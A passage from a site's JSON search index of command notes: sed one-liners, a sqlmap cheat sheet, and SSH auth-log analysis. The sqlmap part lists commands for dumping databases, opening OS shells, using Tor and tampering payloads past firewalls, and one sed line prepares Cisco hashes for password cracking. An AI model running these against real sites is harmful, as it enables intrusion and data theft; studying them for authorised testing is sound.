zeros"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_11","text":"sed -r \"s/(\\x1B|\\033)(\\(B|\\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#urldecoding_1","text":"sed -e 's/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g' | xargs echo -e","title":"urldecoding"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_12","text":"sed -r 's/' $( echo -e \"\\033\" ) '\\[[0-9]{1,2}(;([0-9]{1,2})?)?[mK]//g'","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#replace-words-with-sed_1","text":"sed /BEGIN/,/END/s/xxx/yyy/g input.txt","title":"Replace words with sed"},{"location":"linux/sed/#rebuild-a-delimited-file-with-a-unique-delimiter_1","text":"sed 's/$/uniqueString/' file.old | sed 's/,/\\n/g' | sed ':loop;/^\\\"[^\\\"]*$/N;s/\\n/,/;/[^\\\"]$/t loop' | sed ':loop;N;s/\\n/@/g;/uniqueString$/!b loop;s/uniqueString$//' > file.new","title":"Rebuild a Delimited File with a Unique Delimiter"},{"location":"linux/sed/#delete-all-trailing-whitespace-from-each-line-in-file_3","text":"sed 's/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file>","title":"delete all trailing whitespace from each line in file"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file_4","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file>","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#remove--r-carriage-return-in-a-file_1","text":"sed -i ' s/ \\r //g somefile.txt","title":"Remove  r (carriage return) in a file"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file_5","text":"sed 's/^\\s*//;s/\\s*$//' -i file","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#puts-every-word-from-a-file-into-a-new-line_1","text":"sed -r 's/[ \\t\\r\\n\\v\\f]+/\\^J/g' INFILE > OUTFILE","title":"Puts every word from a file into a new line"},{"location":"linux/sed/#change-your-e-mail-address-in-multiple-files_1","text":"sed -i 's/oldname@example.com/newname@example.com/g' ` grep oldname@example.com -rl . `","title":"Change your e-mail address in multiple files"},{"location":"linux/sed/#delete-all-lines-after-the-first-match_1","text":"sed -n -e '1,/match/p'","title":"Delete all lines after the first match"},{"location":"linux/sed/#extract-ip-addresses-with-sed_3","text":"sed -n 's/.*\\(\\(\\(^\\| \\)[0-9]\\{1,3\\}\\.\\)\\{1\\}\\([0-9]\\{1,3\\}\\.\\)\\{2\\}[0-9]\\{1,3\\}\\) .*/\\1/gp'","title":"Extract ip addresses with sed"},{"location":"linux/sed/#sed-replace-string-in-whole-files-in-folder_1","text":"sed -i 's/SearchString/ReplaceString/g' views/*.php","title":"sed replace string in whole files in folder"},{"location":"linux/sed/#bash-chop_1","text":"sed 's/.$//'","title":"bash chop"},{"location":"linux/sed/#printout-a-list-of-field-numbers-from-a-csv-file-with-headers-as-first-line_1","text":"sed 's/,/\\n/g;q' file.csv | nl","title":"Printout a list of field numbers from a CSV file with headers as first line."},{"location":"linux/sed/#remove-lines-that-contain-a-specific-pattern1-from-file2_1","text":"sed -i '/myexpression/d' /path/to/file.txt","title":"Remove lines that contain a specific pattern(\\(1) from file(\\)2)."},{"location":"linux/sed/#convert-windowsdos-text-files-to-unix_1","text":"sed -i 's/\\r//' <filename>","title":"Convert Windows/DOS Text Files to Unix"},{"location":"linux/sed/#insert-blank-lines_1","text":"sed G input.txt | cat -s","title":"insert blank lines"},{"location":"linux/sed/#removes-lines-range-from-file_1","text":"sed '1,5d' /path/to/file","title":"Removes lines [range] from file"},{"location":"linux/sed/#more-than-4-repeated-characters-to-a-single-character_1","text":"sed -ru 's/(.)\\1{4,}/\\1/g'","title":"more than 4 repeated characters to a single character"},{"location":"linux/sed/#convert-camelcase-to-underscores-camel_case_1","text":"sed -r 's/([a-z]+)([A-Z][a-z]+)/\\1_\\l\\2/g' file.txt","title":"Convert camelCase to underscores (camel_case)"},{"location":"linux/sed/#tells-which-group-you-dont-belong-to-opposite-of-command-groups---uses-sed_1","text":"sed -e \"/ $USER /d;s/:.*//g\" /etc/group | sed -e :a -e '/$/N;s/\\n/ /;ta'","title":"Tells which group you DON'T belong to (opposite of command \"groups\") - uses sed"},{"location":"linux/sed/#remove-blank-lines-from-a-file_1","text":"sed -i.bak '/^[[:space:]]*$/d' file_name","title":"Remove blank lines from a file"},{"location":"linux/sed/#convert-iso8601-dates-to-milliseconds-since-epoch_1","text":"sed \"s|\\(2[0-9]\\{3\\}-[01][0-9]-[0-3][0-9]T[01][0-9]:[0-5][0-9]:[0-5][0-9].[0-9]\\{3\\}Z\\)| $( date -d \\1 +%s ) 000|g\"","title":"Convert ISO8601 dates to milliseconds since epoch"},{"location":"linux/sed/#go-to-the-nth-line-of-file_3","text":"sed -n '15p' $file","title":"Go to the Nth line of file"},{"location":"linux/sed/#mysql-slice-out-a-specific-database-assumes-existence-of-the-use-statement-from-mysqldump-output_1","text":"sed -n \"/^USE \\`employees\\`/,/^USE \\`/p\"","title":"MySQL: Slice out a specific database (assumes existence of the USE statement) from mysqldump output"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_13","text":"sed -r \"s@\\^\\[{1,2}([0-9]{1,2}(;[0-9]{1,2})?(;[0-9])?(m|K){1,2})?@@g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#only-change-the-first-occurrence-of-the-pattern_1","text":"sed -i \"0,/enabled/{s|enabled=0|enabled=1|}\" /etc/yum.repos.d/remi.repo","title":"Only change the first occurrence of the pattern"},{"location":"linux/sed/#remove-the-first-line-containing-match-from-file_1","text":"sed -i \" $( grep -nm 1 match file | cut -f1 -d: ) d\" file","title":"Remove the first line containing 'match' from file"},{"location":"linux/sed/#replace-deprecated-php-function-split-in-php-files_1","text":"sed -i s/split \\( /explode \\( / whatever.php","title":"replace deprecated php-function split in php files"},{"location":"linux/sed/#file-without-comments-or-blank-lines_1","text":"sed 's/^[[:blank:]]*//; s/^#.*//; /^$/d' filename","title":"File without comments or blank lines."},{"location":"linux/sed/#comment-out-all-lines-in-a-file-beginning-with-string_3","text":"sed -i '/^somestring/ s/^/#/' somefile.cfg","title":"Comment out all lines in a file beginning with string"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_14","text":"sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#replace-strings-in-files_1","text":"sed -i -e 's/war/peace/g' *","title":"Replace strings in files"},{"location":"linux/sed/#pick-up-3-lines-start-at-every-5th-line-of-filetxt_1","text":"sed -n '1~5{N;N;p}' file.txt","title":"pick up 3 lines start at every 5th line of file.txt"},{"location":"linux/sed/#regular-expression-search-pattern-to-remove-the-datetime-and-name-when-you-paste-from-skype-chat-into-your-text-editor_1","text":"sed -i 's/^.*?].*?:\\s//g' skype-chat-log.txt","title":"Regular expression search pattern to remove the Datetime and Name when you paste from skype chat into your text editor"},{"location":"linux/sed/#analyze-apache-web-log-statistics-starting-on-date-x_1","text":"sed -n '/05\\/Dec\\/2010/,$ p' access.log | goaccess -s -b","title":"Analyze Apache Web Log Statistics starting on DATE x"},{"location":"linux/sed/#duplicate-a-line-in-a-text-file-and-replace-part-of-the-duplicated-line_1","text":"sed -i -e '/foo/p' -e 's/foo/barfoo/' file","title":"Duplicate a line in a text file and replace part of the duplicated line"},{"location":"linux/sed/#format-a-password-file-for-john-the-ripper-from-cisco-configs--level-5_1","text":"sed -n 's/[ :]/_/g; s/^\\(.\\{1,\\}\\)_5_\\($1$[$./0-9A-Za-z]\\{27,31\\}\\)_*$/\\1:\\2/p' < cisco-device-config > passwd","title":"Format a password file for John the Ripper from Cisco configs  (Level 5)"},{"location":"linux/sed/#html-esacaping-with-sed_1","text":"sed 's/&/\\&amp;/g; s/</\\&lt;/g; s/>/\\&gt;/g; s/\"/\\&quot;/g; s/' \"'\" '/\\&#39;/g'","title":"HTML esacaping with sed"},{"location":"linux/sed/#parse-bookmarks-and-download-youtube-files_1","text":"sed 's+href=\"\\([^\"]*\\)\"+\\n\\1\\n+g' bookmarks.html | grep '^http' | clive","title":"Parse bookmarks and download youtube files"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_15","text":"sed -E \"s/\" $'\\E' \"\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#extract-specific-lines-from-a-text-file-using-stream-editor-sed_1","text":"sed -n -e 1186 ,1210p A-small-practice.in","title":"Extract specific lines from a text file using Stream Editor (sed)"},{"location":"linux/sed/#insert-lines-at-top-of-file-using-sed_1","text":"sed -i '1iI am a new line' file.txt","title":"Insert line(s) at top of file using sed"},{"location":"linux/sed/#extract-xml-from-an-otherwise-plain-text-log-file_1","text":"sed -n '/<Tag>/,/<\\/Tag>/p' logfile.log","title":"Extract XML from an otherwise plain text log file"},{"location":"linux/sed/#list-the-cpu-model-name_1","text":"sed -n 's/^model name[ \\t]*: *//p' /proc/cpuinfo","title":"List the CPU model name"},{"location":"linux/sed/#edit-hosts-file-to-remove-foonovalocal-from-it-where-foo-is-the-hostname-of-a-new-vm_1","text":"sed -e \"s/^127.0.1.1 $( hostname ) .novalocal/127.0.1.1/g\" /etc/hosts","title":"Edit hosts file to remove \"foo.novalocal\" from it where foo is the hostname of a new VM"},{"location":"linux/sed/#convert-html-links-into-plain-text-with-link-anchor_1","text":"sed 's!<[Aa] *href*=*\"\\([^\"]*\\)\"*>\\([^<>]*\\)</[Aa]>!\\1,\\2!g' links.html","title":"convert html links into plain text with link anchor"},{"location":"linux/sed/#delete-first-and-last-line-from-file_1","text":"sed '1d;$d' filename","title":"delete first and last line from file"},{"location":"linux/sed/#remove-comments-from-files_3","text":"sed -i -e '/^#[^!].*/d' -e 's/\\(.*[^!]\\)#.*[^}]/\\1/' <filename>","title":"Remove comments from files"},{"location":"linux/sed/#sort-a-one-per-line-list-of-email-address-weeding-out-duplicates_1","text":"sed 's/[ \\t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort | uniq > emails_sorted.txt","title":"Sort a one-per-line list of email address, weeding out duplicates"},{"location":"linux/sed/#join-lines-split-with-backslash-at-the-end_1","text":"sed -e '/\\\\$/{:0;N;s/\\\\\\n//;t0}'","title":"Join lines split with backslash at the end"},{"location":"linux/sed/#cut-everything-until-last-slash","text":"sed 's:..*/::' echo \" ${ var ##*/ } \" # Colorize sed outpu printf 'my ERROR color' | sed s/ERROR/ ` printf \"\\033[32mERROR\\033[0m\" ` /","title":"Cut everything until last slash"},{"location":"linux/sed/#remove-all-space-before-a-line","text":"sed 'NUMq;d'","title":"Remove all space before a line"},{"location":"linux/sed/#print-only-num-line","text":"sed -e 's/^[ \\t]*//'","title":"Print only NUM line"},{"location":"linux/sed/#remove-all-leading-and-trailing-whitespace-from-end-of-each-line","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//'","title":"Remove all leading and trailing whitespace from end of each line"},{"location":"linux/sed/#print-everything-after-","text":"sed 's:.*/::'","title":"Print everything after /"},{"location":"linux/sed/#print-everything-after-stalled","text":"sed -n -e 's/^.*stalled: //p'","title":"Print everything after stalled"},{"location":"linux/sed/#cut-all-spaces-infront-of-all-words","text":"sed -e 's/^[ \\t]*//'","title":"Cut all spaces infront of all words"},{"location":"linux/sed/#make-space-very-3-word","text":"echo \"Youcaneasilydothisbyhighlightingyourcode.\" | sed 's/\\(.\\{3\\}\\)/\\1 /g'","title":"Make space very 3 word"},{"location":"linux/sed/#cut-after-every-third-line","text":"printf 'Line 1\\nLine 2\\nLine 3\\nLine 4\\nLine 5\\n' | sed '$!N;$!N;s/\\n/ /g'","title":"Cut after every third line"},{"location":"linux/sed/#print-with-tabular","text":"head -4 /etc/passwd | tr : , | sed -e 's/^/| /' -e 's/,/,| /g' -e 's/$/,|/' | column -t -s,","title":"Print with tabular"},{"location":"linux/sed/#resources","text":"https://fabianlee.org/2018/10/28/linux-using-sed-to-insert-lines-before-or-after-a-match/","title":"Resources"},{"location":"linux/sqlmap/","text":"sqlmap If you don\u2019t know anything about the target site then use the normal command first, Observe if the SQLMap found something juicy for you Basic usage sqlmap -u \u201chttps://target_site.com/page/\u201d Automatic GET request parameter sqlmap -u \u201chttps://target_site.com/page?p1 = value1 & p2 = value2\u201d Specify the GET request parameters to Exploit You can specify on which parameter you want to check or exploit the sql injection using just \u201c-p\u201d flag. sqlmap -u \u201chttps://target_site.com/page?p1 = value1 & p2 = value2\u201d -p p1 Use POST requests (Test All parameters) sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" SQLMap Request file as input You can specify a request file containing the HTTP request, You can get it quickly from BurpSuite. sqlmap -r request.txt Here you can specify the targeted parameter or sqlmap will recognize and will test for all the parameters found. !! info \"Specify Custom Position in HTTP request file - You can use the asterisk sign(*) to specify which parameter to attack or which place of the request to be attacked. You can specify or mark any part of the request by this method.\" Use Authenticated Session With Cookie sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --cookie = \"Session_Cookie_Value\" Use Authenticated Session with Auth Headers sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --headers = \"Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l\" Basic Authentication sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --auth-type = basic --auth-cred = username:password Use Previously created Session as SQLmap input (-s) If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.) sqlmap -u \u201chttps://target_site.com/page?p1 = value1 \" -s SESSION-FILE.sqlite --dbs Post Exploitation Commands If the SQL injection vulnerability is observed positive then you can use the following commands to Exploit the SQL injection vulnerability. List the Databases sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --dbs List Tables of Database TARGET_DB sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB --tables List Columns of Table TARGET_TABLE of Database TARGET_DB sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE --columns Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE -C \"Col1,Col2\" --dump Fully Dump Table TARGET_TABLE of Database TARGET_DB sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE --dump Dump full Database sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB --dump Custom SQL query sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --sql-query \"SELECT * FROM TARGET_DB;\" Get OS Shell sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --os-shell Get SQL shell sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --sqlmap-shell SQLMap Proxy Proxy through Burpsuite sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --proxy = \"http://127.0.0.1:8080/\" Use Tor Socks5 proxy sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --tor --tor-type = SOCKS5 --check Extra Specify The Database Type sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --dbms = mysql You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc. Attack Techniques \u2013technique Specify a letter or letters of BEUSTQ to control the exploit attempts: B: `Boolean-based blind` E: `Error-based` U: `Union query-based` S: `Stacked queries` T: `Time-based blind` Q: `Inline queries` sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --technique = BEUSTQ Specify the Injection Techniques You can specify the difficulty levels using two flags, Option: --risk \u2013level = LEVEL Level of tests to perform (1-5, default 1) \u2013risk=RISK Risk of tests to perform (0-3, default 1)```sh sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --risk = 3 --level = 5 This option requires an argument that specifies the risk of tests to perform. There are three risk values. \u2013riks=1: 1 is the default value which is for the majority of SQL injection points. \u2013riks=2: Adds to the default level the tests for heavy query time-based SQL injections \u2013riks=3: Value 3 adds also OR-based SQL injection tests. When the value of \u2013level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. Use Default Options for the process Use \u2013batch flag to use all the default options or used for non-interactive sessions. (By specifying \u2013batch flag, sqlmap will not ask you for the (Y/N) choice rather then it will smartly choose according to the needs.) ```sh sqlmap -u \u201chttps://target_site.com/page?p1=value1\u201d --batch Force SQLmap to use SSL or TLS for its requests. \u2013force-ssl flag - Error: Can\u2019t establish SSL connection If you getting the following error during testing then you can use the flag \u2013force-ssl to force SQLMap to use SSL or TLS. Tamper Scripts You can use the tamper scripts to bypass WAF or to modify the payload. You can use multiple tampering scripts at once using \u2013tamper flag. sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --tamper = charencode For General Perpose Usecase: tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes MSSQL: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dsash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes MySQL: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor OR You can create your own Custom Tamper script to overcome the issue of some type of Encrypted payloads like AES, DES, Hashing, etc.","title":"sqlmap"},{"location":"linux/sqlmap/#sqlmap","text":"If you don\u2019t know anything about the target site then use the normal command first, Observe if the SQLMap found something juicy for you","title":"sqlmap"},{"location":"linux/sqlmap/#basic-usage","text":"sqlmap -u \u201chttps://target_site.com/page/\u201d","title":"Basic usage"},{"location":"linux/sqlmap/#automatic-get-request-parameter","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1 & p2 = value2\u201d","title":"Automatic GET request parameter"},{"location":"linux/sqlmap/#specify-the-get-request-parameters-to-exploit","text":"You can specify on which parameter you want to check or exploit the sql injection using just \u201c-p\u201d flag. sqlmap -u \u201chttps://target_site.com/page?p1 = value1 & p2 = value2\u201d -p p1","title":"Specify the GET request parameters to Exploit"},{"location":"linux/sqlmap/#use-post-requests-test-all-parameters","text":"sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\"","title":"Use POST requests (Test All parameters)"},{"location":"linux/sqlmap/#sqlmap-request-file-as-input","text":"You can specify a request file containing the HTTP request, You can get it quickly from BurpSuite. sqlmap -r request.txt","title":"SQLMap Request file as input"},{"location":"linux/sqlmap/#here-you-can-specify-the-targeted-parameter-or-sqlmap-will-recognize-and-will-test-for-all-the-parameters-found","text":"!! info \"Specify Custom Position in HTTP request file - You can use the asterisk sign(*) to specify which parameter to attack or which place of the request to be attacked. You can specify or mark any part of the request by this method.\"","title":"Here you can specify the targeted parameter or sqlmap will recognize and will test for all the parameters found."},{"location":"linux/sqlmap/#use-authenticated-session-with-cookie","text":"sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --cookie = \"Session_Cookie_Value\"","title":"Use Authenticated Session With Cookie"},{"location":"linux/sqlmap/#use-authenticated-session-with-auth-headers","text":"sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --headers = \"Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l\"","title":"Use Authenticated Session with Auth Headers"},{"location":"linux/sqlmap/#basic-authentication","text":"sqlmap -u \u201chttps://target_site.com/page/\u201d --data = \"p1=value1&p2=value2\" --auth-type = basic --auth-cred = username:password","title":"Basic Authentication"},{"location":"linux/sqlmap/#use-previously-created-session-as-sqlmap-input--s","text":"If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.) sqlmap -u \u201chttps://target_site.com/page?p1 = value1 \" -s SESSION-FILE.sqlite --dbs","title":"Use Previously created Session as SQLmap input (-s)"},{"location":"linux/sqlmap/#post-exploitation-commands","text":"If the SQL injection vulnerability is observed positive then you can use the following commands to Exploit the SQL injection vulnerability.","title":"Post Exploitation Commands"},{"location":"linux/sqlmap/#list-the-databases","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --dbs","title":"List the Databases"},{"location":"linux/sqlmap/#list-tables-of-database-target_db","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB --tables","title":"List Tables of Database TARGET_DB"},{"location":"linux/sqlmap/#list-columns-of-table-target_table-of-database-target_db","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE --columns","title":"List Columns of Table TARGET_TABLE of Database TARGET_DB"},{"location":"linux/sqlmap/#dump-specific-data-of-columns-of-table-target_table-of-database-target_db","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE -C \"Col1,Col2\" --dump","title":"Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB"},{"location":"linux/sqlmap/#fully-dump-table-target_table-of-database-target_db","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB -T TARGET_TABLE --dump","title":"Fully Dump Table TARGET_TABLE of Database TARGET_DB"},{"location":"linux/sqlmap/#dump-full-database","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d -D TARGET_DB --dump","title":"Dump full Database"},{"location":"linux/sqlmap/#custom-sql-query","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --sql-query \"SELECT * FROM TARGET_DB;\"","title":"Custom SQL query"},{"location":"linux/sqlmap/#get-os-shell","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --os-shell","title":"Get OS Shell"},{"location":"linux/sqlmap/#get-sql-shell","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --sqlmap-shell","title":"Get SQL shell"},{"location":"linux/sqlmap/#sqlmap-proxy","text":"","title":"SQLMap Proxy"},{"location":"linux/sqlmap/#proxy-through-burpsuite","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --proxy = \"http://127.0.0.1:8080/\"","title":"Proxy through Burpsuite"},{"location":"linux/sqlmap/#use-tor-socks5-proxy","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --tor --tor-type = SOCKS5 --check","title":"Use Tor Socks5 proxy"},{"location":"linux/sqlmap/#extra","text":"","title":"Extra"},{"location":"linux/sqlmap/#specify-the-database-type","text":"sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --dbms = mysql You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc.","title":"Specify The Database Type"},{"location":"linux/sqlmap/#attack-techniques","text":"\u2013technique Specify a letter or letters of BEUSTQ to control the exploit attempts: B: `Boolean-based blind` E: `Error-based` U: `Union query-based` S: `Stacked queries` T: `Time-based blind` Q: `Inline queries` sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --technique = BEUSTQ","title":"Attack Techniques"},{"location":"linux/sqlmap/#specify-the-injection-techniques","text":"You can specify the difficulty levels using two flags, Option: --risk \u2013level = LEVEL Level of tests to perform (1-5, default 1) \u2013risk=RISK Risk of tests to perform (0-3, default 1)```sh sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --risk = 3 --level = 5","title":"Specify the Injection Techniques"},{"location":"linux/sqlmap/#this-option-requires-an-argument-that-specifies-the-risk-of-tests-to-perform-there-are-three-risk-values","text":"\u2013riks=1: 1 is the default value which is for the majority of SQL injection points. \u2013riks=2: Adds to the default level the tests for heavy query time-based SQL injections \u2013riks=3: Value 3 adds also OR-based SQL injection tests. When the value of \u2013level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. Use Default Options for the process Use \u2013batch flag to use all the default options or used for non-interactive sessions. (By specifying \u2013batch flag, sqlmap will not ask you for the (Y/N) choice rather then it will smartly choose according to the needs.) ```sh sqlmap -u \u201chttps://target_site.com/page?p1=value1\u201d --batch","title":"This option requires an argument that specifies the risk of tests to perform. There are three risk values."},{"location":"linux/sqlmap/#force-sqlmap-to-use-ssl-or-tls-for-its-requests","text":"\u2013force-ssl flag - Error: Can\u2019t establish SSL connection If you getting the following error during testing then you can use the flag \u2013force-ssl to force SQLMap to use SSL or TLS.","title":"Force SQLmap to use SSL or TLS for its requests."},{"location":"linux/sqlmap/#tamper-scripts","text":"You can use the tamper scripts to bypass WAF or to modify the payload. You can use multiple tampering scripts at once using \u2013tamper flag. sqlmap -u \u201chttps://target_site.com/page?p1 = value1\u201d --tamper = charencode","title":"Tamper Scripts"},{"location":"linux/sqlmap/#for-general-perpose-usecase","text":"tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes","title":"For General Perpose Usecase:"},{"location":"linux/sqlmap/#mssql","text":"tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dsash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes","title":"MSSQL:"},{"location":"linux/sqlmap/#mysql","text":"tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor OR You can create your own Custom Tamper script to overcome the issue of some type of Encrypted payloads like AES, DES, Hashing, etc.","title":"MySQL:"},{"location":"linux/ssh-log/","text":"ssh-logs Read SSH logs as a PRO from command line.. Print failed passwords head -n -250 /var/log/auth.log Simple analysis of log awk \"/.*Failed password.*/ { print $1 }\" /var/log/auth.log Print how many failed attemps tried login grep \"Failed password\" /var/log/auth.log | wc -l Print all successs attempts grep \"password\" /var/log/auth.log | grep -v Failed | grep -v Invalid View all log files ls /var/log/auth.log* -lht Summarize information simply cat /var/log/auth.log | grep \"Failed password\" | head -1 | awk '{while($i){print i, $i;i++}}' Column 11 is IP and column 9 is the user name the attacker attempted. cat /var/log/auth.log | grep \"Failed password\" | grep invalid | head -1 | awk '{while($i){print i, $i;i++}}' Put the log files together and unzip them mkdir authlog ; cp /var/log/auth.log* authlog/ ; cd authlog ; gunzip auth.log.*.gz Statistics of attacker IP awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | wc -l Sort by number of attacks awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | sort -k2 -rn | head Save to file awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | sort -k2 -rn > ip.log Look at the just saved one ip.log Top 10 items in the document head -10 ip.log | awk '{print $1\" \";system(\"curl http://freeapi.ipip.net/\"$1);print(\"\\n\")}' The user name the attacker attempted awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(user in users){print user, users[user]}}' /var/log/auth.* | sort -k2 -rn | wc -l View the number of items awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(user in users){print user, users[user]}}' /var/log/auth.* | sort -k2 -rn | head","title":"ssh-log"},{"location":"linux/ssh-log/#ssh-logs","text":"Read SSH logs as a PRO from command 